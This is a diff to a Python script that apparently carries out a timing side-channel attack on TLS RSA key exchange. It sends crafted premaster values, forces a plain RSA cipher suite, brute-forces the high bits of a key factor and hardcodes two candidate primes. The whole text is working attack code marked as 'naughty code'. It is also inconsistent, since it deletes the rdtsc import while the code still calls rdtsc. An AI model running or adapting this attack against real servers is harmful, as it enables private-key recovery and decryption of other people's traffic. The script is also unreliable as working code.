@@ -1,11 +1,18 @@
 import socket
 import tlslite
-import rdtsc
 import sympy
 import sample
 
 
 from tlslite.handshakesettings import HandshakeSettings
+from tlslite.constants import CipherSuite
+
+q = sympy.Integer(
+    11353860437120204348539420361367294927683441924641720282978666316144621735920188475867378638813811676070362003602263559496393696538309271007870774914687283
+)
+p = sympy.Integer(
+    11693128827090800677443535237632476895247105886644942164014088484470194179491435241190389270827811769965853291192455791684691555403909415703633832493911789
+)
 
 
 class RSAKeyExchangeAttack(tlslite.keyexchange.RSAKeyExchange):
@@ -17,7 +24,7 @@ class RSAKeyExchangeAttack(tlslite.keyexchange.RSAKeyExchange):
 
     def processServerKeyExchange(self, srvPublicKey, serverKeyExchange):
         """Generate premaster secret for server"""
-        g_bytes = sympy_integer_to_bytes(self.g)
+        g_bytes = sympy_integer_to_bytes(self.g, length=128)
         self.encPremasterSecret = g_bytes
         return g_bytes
 
@@ -57,7 +64,7 @@ class AttackTLSConnection(tlslite.TLSConnection):
         extensions = None
 
         # getCertSuites() returns the "plain" RSA cipher suits.
-        cipherSuites = tlslite.constants.CipherSuite.getCertSuites(settings)
+        cipherSuites = [CipherSuite.TLS_RSA_WITH_AES_128_CBC_SHA]
         certificateTypes = settings.getCertificateTypes()
 
         # Construct message, then send
@@ -101,6 +108,12 @@ class AttackTLSConnection(tlslite.TLSConnection):
         clientCertChain = None
         privateKey = None
 
+        # <nice code>
+        # keyExchange = tlslite.keyexchange.RSAKeyExchange(
+        #     cipherSuite, clientHello, serverHello, None
+        # )
+        # </nice code>
+
         # <naughty code>
         keyExchange = RSAKeyExchangeAttack(
             cipherSuite, clientHello, serverHello, None, g
@@ -139,7 +152,7 @@ class AttackTLSConnection(tlslite.TLSConnection):
 
             masterSecret = result
 
-            return False
+            return masterSecret, False
 
         except tlslite.errors.TLSRemoteAlert:
             end_time = rdtsc.get_cycles()
@@ -160,13 +173,16 @@ def sympy_integer_to_bits(integer, byteorder="big"):
     return bits
 
 
-def sympy_integer_to_bytes(integer, byteorder="big"):
+def sympy_integer_to_bytes(integer, byteorder="big", length=None):
     bys = []
 
     reduced = integer
     while reduced > 0:
         bys.append(reduced % 256)
         reduced = reduced // 256
+
+    if length:
+        bys = bys + [0] * (length - len(bys))
 
     if byteorder == "big":
         bys.reverse()
@@ -198,8 +214,16 @@ def bruteforce_most_significant_bits():
         for i in (0, 1):
             for j in (0, 1):
                 for k in (0, 1):
-                    g = bits_to_sympy_integer([h, i, j, k] + [0] * 509)
-                    gs.append(g)
+                    for l in (0, 1):
+                        g = bits_to_sympy_integer([h, i, j, k, l] + [0] * 508)
+                        gs.append(g)
+
+    minimum = sympy.sympify("2**511")
+    maximum = sympy.sympify("3*2**512")
+    gs = [g for g in gs if minimum <= g <= maximum]
+
+    gs.append(p)
+    gs.append(q)
 
     sample.sample(gs, 5000)
 
